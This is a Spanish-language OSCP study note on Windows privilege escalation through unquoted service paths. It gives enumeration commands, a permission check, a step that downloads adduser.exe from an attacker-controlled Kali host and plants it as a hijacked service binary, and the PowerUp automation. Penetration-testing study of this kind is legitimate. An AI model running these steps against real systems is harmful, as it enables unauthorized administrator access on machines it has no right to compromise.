---
tipo: tecnica
fase: privesc
so: windows
tags: [oscp, tecnica, privesc, windows]
fecha: 2026-10-08
---

# Unquoted Service Paths

> [!abstract] Qué es y cuándo usarla
> Si la ruta del binario de un servicio tiene espacios y no está entre comillas, Windows (`CreateProcess`) prueba a ejecutar, de izquierda a derecha, cada sub-cadena terminada en `.exe` antes de probar la ruta completa. Si el user tiene permiso de escritura en alguna carpeta intermedia de esa ruta, puede colocar ahí un ejecutable con el nombre adecuado para que se ejecute en vez del binario legítimo.

## Requisitos previos
- Localizar servicios con ruta sin comillas y con espacios: `wmic service get name,pathname | findstr /i /v "C:\Windows\" | findstr /i /v """` (en `cmd.exe`, evita problemas de escapado de `findstr` en PowerShell).
- Poder iniciar/detener el servicio (`Start-Service`/`Stop-Service` sin error) o reiniciar la máquina.
- Permiso de escritura (`icacls`) en alguna de las carpetas intermedias de la ruta (nunca en `C:\` ni en `C:\Program Files\` directamente, pero sí a veces en subcarpetas creadas por apps de terceros).

## Pasos
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName    # revisar rutas con espacios
```
```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\" | findstr /i /v """
```
```powershell
Start-Service <servicio>          # confirmar que el user puede arrancarlo/pararlo
Stop-Service <servicio>
icacls "C:\carpeta\intermedia"     # buscar la primera carpeta de la ruta donde el user tiene escritura
```
```powershell
iwr -uri http://<IP_kali>/adduser.exe -Outfile Current.exe
copy .\Current.exe 'C:\carpeta\intermedia\Current.exe'     # nombre = primer segmento de ruta sin espacio tras esa carpeta
Start-Service <servicio>                                      # Windows ejecuta Current.exe en vez del binario real
net localgroup administrators
```

Automatizado con **PowerUp.ps1**:
```powershell
Get-UnquotedService
Write-ServiceBinary -Name '<servicio>' -Path "C:\carpeta\intermedia\Current.exe"
Restart-Service <servicio>
```

> [!warning] Detección / problemas
> - El ejecutable malicioso debe llamarse exactamente como el primer segmento de ruta sin espacio (ej. `Current.exe` para `...\Current Version\...`), no como el binario legítimo.
> - `C:\` y `C:\Program Files\` casi nunca son escribibles por un user estándar; buscar carpetas creadas por software de terceros con permisos más laxos.
> - El servicio puede devolver error al arrancar con el binario falso (no es un servicio real) — igualmente el payload ya se ejecutó antes de fallar.

## Visto en
- Módulo: [[17 - Windows Privilege Escalation]]
- Relacionado: [[Service Binary Hijacking]] · [[DLL Hijacking]]
- Máquinas: [[]]
